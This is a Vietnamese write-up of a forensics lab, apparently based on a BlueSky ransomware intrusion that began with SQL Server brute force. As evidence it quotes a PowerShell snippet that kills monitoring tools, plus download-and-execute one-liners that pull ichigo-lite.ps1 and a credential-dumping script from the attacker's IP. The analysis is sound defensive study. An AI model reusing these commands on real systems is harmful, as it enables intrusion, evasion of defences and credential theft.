# Q1: 

![ảnh](https://github.com/LDV-SpaceK/CTF-Learning/assets/151914246/a1fa9dce-6670-44f1-9359-b9e5b06d7c6a)

* Đầu tiên mình xem giao tiếp giữa các địa chỉ ipv4 có trong file capture được thì có hai địa chỉ giao tiếp với nhau rất nhiều packet
* 2 con ip 84 và 81

![ảnh](https://github.com/LDV-SpaceK/CTF-Learning/assets/151914246/f739e97c-f26f-42a5-ab36-48fe237bd3c0)

* Tiếp đến mình xem các protocol trong file pcap thì có những protocol nhiều như là TDS, HTTP nên mình filter thử HTTP và tìm thấy máy 81 đã download rất nhiều file từ máy 84

![ảnh](https://github.com/LDV-SpaceK/CTF-Learning/assets/151914246/d854becf-5bf6-4f4d-a7ea-48b5471f0f30)

* mình đọc thử file checking.ps1 thì thấy có vẻ máy 84 đang có hành động tắt window defender và tạo persistence

![ảnh](https://github.com/LDV-SpaceK/CTF-Learning/assets/151914246/07388958-dba2-4ffa-8f60-8b8dfd58169e)

# Q2: 

![ảnh](https://github.com/LDV-SpaceK/CTF-Learning/assets/151914246/fd071b02-0562-4c26-9995-32012bef8991)

* Câu hỏi liên quan đến đối tượng bị tấn công nên mình đã xem thử qua file event log để truy tìm điểm đáng ngờ

![ảnh](https://github.com/LDV-SpaceK/CTF-Learning/assets/151914246/f2d325b8-b3cb-4cea-8262-e4e54c3f3130)

* có một loạt những hành động đăng nhập vào tài khoản người dùng "sa" - system administrator
* đây là hành vi bruteforce

# Q3: 

![ảnh](https://github.com/LDV-SpaceK/CTF-Learning/assets/151914246/7e89b960-e31d-46ab-83a5-dab946eb42a2)

* mình search được rằng microsoft sql server giao tiếp bằng giao thức TDS và mình có thấy file này có giao thức đó nên mình filter TDS

![ảnh](https://github.com/LDV-SpaceK/CTF-Learning/assets/151914246/34f1b8ab-7648-4f4f-afae-4f2906b39630)

* tại gói tin 2641 mình đã thấy password

![ảnh](https://github.com/LDV-SpaceK/CTF-Learning/assets/151914246/bc58c55a-ab75-4c28-8f6e-e21edb1ecde2)

# Q4:

![ảnh](https://github.com/LDV-SpaceK/CTF-Learning/assets/151914246/e3fe4f5b-d2d0-4358-8cbc-02695d6155f5)

* sau khi đăng nhập thành công, kẻ tấn công đã bật một setting xp_cmdshell

![ảnh](https://github.com/LDV-SpaceK/CTF-Learning/assets/151914246/f608cd36-486f-45eb-ab7d-b83917d75a68)

* mình search được là setting này cho phép người dùng sử dụng câu lệnh cmd trên sql server

# Q5:

![ảnh](https://github.com/LDV-SpaceK/CTF-Learning/assets/151914246/9757872c-cf29-4c68-b6ff-346c5453faa0)

* sau khi đăng nhập thành công thì kẻ tấn công đã sử dụng một service là winlogon.exe nhưng hostname lại là MSFConsole(Metasploit)

![ảnh](https://github.com/LDV-SpaceK/CTF-Learning/assets/151914246/4b0e2dd4-d1b7-4de8-9b76-50fc11e48cf3)

# Q6: 

![ảnh](https://github.com/LDV-SpaceK/CTF-Learning/assets/151914246/5efc2886-c327-4b51-b015-3a70ed9c0267)

* Đọc trong file pcap mình thấy file đầu tiên được tải về là checking.ps1 có chứa đoạn code thực hiện hành vi leo quyền

![ảnh](https://github.com/LDV-SpaceK/CTF-Learning/assets/151914246/ada8122d-94ef-4e99-8d33-1c1efa28b82f)

# Q7:

![ảnh](https://github.com/LDV-SpaceK/CTF-Learning/assets/151914246/03c8c302-6757-45c0-b17b-e13c328e599f)

* nhóm người dùng bị check là "S-1-5-32-544"

`$priv = [bool](([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match "S-1-5-32-544")`

* đối tượng priv được gán là nếu người dùng hiện tại thuộc nhóm có SID là S-1-5-32-544

# Q8:

![ảnh](https://github.com/LDV-SpaceK/CTF-Learning/assets/151914246/d7aab19c-c08c-4d20-8a27-ffd8ae360bc1)

* cũng trong file đó, có một hàm tắt windows defender

![ảnh](https://github.com/LDV-SpaceK/CTF-Learning/assets/151914246/fa16bace-0a30-4e00-a682-06e9058687bc)

* các key như DisableAntiSpyware,... từ registry hive HKLM:\SOFTWARE\Microsoft\Windows Defender bị tắt

# Q9: 

![ảnh](https://github.com/LDV-SpaceK/CTF-Learning/assets/151914246/9c7fab3d-f78f-4edf-b367-bf920280b9cb)

* file thứ hai được tải về là file del.ps1
* trong file checking.ps1 có hàm CleanerEtc đã tải xuống file del.ps1 từ địa chỉ ip 84

![ảnh](https://github.com/LDV-SpaceK/CTF-Learning/assets/151914246/f9ef3d47-64ae-40ad-9ad9-23d47a9274f2)

# Q10:

![ảnh](https://github.com/LDV-SpaceK/CTF-Learning/assets/151914246/3e193501-468d-499b-b152-bab9647cd6ab)

* kẻ tấn công đã tạo persistence bằng schedule task, tên của task đó là "\Microsoft\Windows\MUI\LPupdate"

![ảnh](https://github.com/LDV-SpaceK/CTF-Learning/assets/151914246/86ab784f-f880-43c7-aeac-50b3f56fe495)

# Q11:

![ảnh](https://github.com/LDV-SpaceK/CTF-Learning/assets/151914246/4ed9c1c4-e128-437b-b3b1-56aa2bd2fb65)

* mình đọc file del.ps1 thì thấy file này có hành vi dừng những process quan trọng để phục vụ cho mục đích tấn công

```
Get-WmiObject _FilterToConsumerBinding -Namespace root\subscription | Remove-WmiObject

$list = "taskmgr", "perfmon", "SystemExplorer", "taskman", "ProcessHacker", "procexp64", "procexp", "Procmon", "Daphne"
foreach($task in $list)
{
    try {
        stop-process -name $task -Force
    }
    catch {}
}

stop-process $pid -Force
```

* mình search được đây là bước Defense Avasion - TA0005

https://attack.mitre.org/

# Q12: 

![ảnh](https://github.com/LDV-SpaceK/CTF-Learning/assets/151914246/2f1d822b-f834-4fe5-8c28-507c7204aa60)

* sau khi tạo persistence, file checking.ps1 đã tải xuống một file ichigo-lite.ps1

`Invoke-Expression ((New-Object System.Net.WebClient).DownloadString('http://87.96.21.84/ichigo-lite.ps1'))`

* trong file ichigo-lite thì lại tải xuống tiếp file Invoke-PowerDump.ps1

`Invoke-Expression (New-Object System.Net.WebClient).DownloadString('http://87.96.21.84/Invoke-PowerDump.ps1')`

* Trong file này có những hàm lấy dữ liệu từ máy nạn nhân

![ảnh](https://github.com/LDV-SpaceK/CTF-Learning/assets/151914246/b6d88634-ec40-48a0-b84f-48cbb241f2f5)

![ảnh](https://github.com/LDV-SpaceK/CTF-Learning/assets/151914246/41f95494-15d0-436e-b847-b1f04862484f)

![ảnh](https://github.com/LDV-SpaceK/CTF-Learning/assets/151914246/fdcea272-5aca-4476-810e-e1784606bb7b)

![ảnh](https://github.com/LDV-SpaceK/CTF-Learning/assets/151914246/646a3d3a-b8f0-4a1b-83ad-7bb783549456)

# Q13:

![ảnh](https://github.com/LDV-SpaceK/CTF-Learning/assets/151914246/b14734c5-c9e4-42a8-9ce8-5b8a94b78224)

* quay trở lại với file ichigo-lite thì sau khi tải xuống file đó thì sau khi tải xuống file PowerDump thì kẻ tấn công đã lưu file vào hashes.txt

![ảnh](https://github.com/LDV-SpaceK/CTF-Learning/assets/151914246/e6b0d18c-2fad-49f9-9fd3-cff7a68d76fa)

* hai câu lệnh bị base64 encode

![ảnh](https://github.com/LDV-SpaceK/CTF-Learning/assets/151914246/8167a785-8c19-4618-b883-6f49f36fa010)

# Q14: 

![ảnh](https://github.com/LDV-SpaceK/CTF-Learning/assets/151914246/31727c06-8e2d-43ef-9a0a-bd9302733625)

* có một câu lệnh

![ảnh](https://github.com/LDV-SpaceK/CTF-Learning/assets/151914246/3fc4b755-8857-4383-91fa-a867bafcaa37)

* có vẻ kẻ tấn công đã tải xuống một list các host có thể tấn công

![ảnh](https://github.com/LDV-SpaceK/CTF-Learning/assets/151914246/3077b4ee-8e8a-4260-acce-3ee629b879b6)

# Q15:

![ảnh](https://github.com/LDV-SpaceK/CTF-Learning/assets/151914246/97da03c8-9bb9-4de8-aa29-28c9fe17b52a)

* mình search thử bluesky ransomware thì mình đã đọc được tại một trang web https://www.sentinelone.com/blog/bluesky-ransomware-ad-lateral-movement-evasion-and-fast-encryption-puts-threat-on-the-radar/

![ảnh](https://github.com/LDV-SpaceK/CTF-Learning/assets/151914246/48422404-f5eb-4037-a7ab-114284f61970)

# Q16: 

![ảnh](https://github.com/LDV-SpaceK/CTF-Learning/assets/151914246/11be9efe-e71a-4798-a08c-734170739a4a)

* file ichigo-lite đã tải xuống một file javaw.exe

![ảnh](https://github.com/LDV-SpaceK/CTF-Learning/assets/151914246/6cfd343e-6907-43b1-b43c-f5576f11dfbe)

* mình thử export file này ra và cho virustotal kiểm tra

![ảnh](https://github.com/LDV-SpaceK/CTF-Learning/assets/151914246/a3761631-e1a7-494c-93dc-fcff4ffe2ec1)

* file này chính là file mã độc, có ransomware family là Conti

# Link bài lab: 

https://thedfirreport.com/2023/12/04/sql-brute-force-leads-to-bluesky-ransomware/













 



 



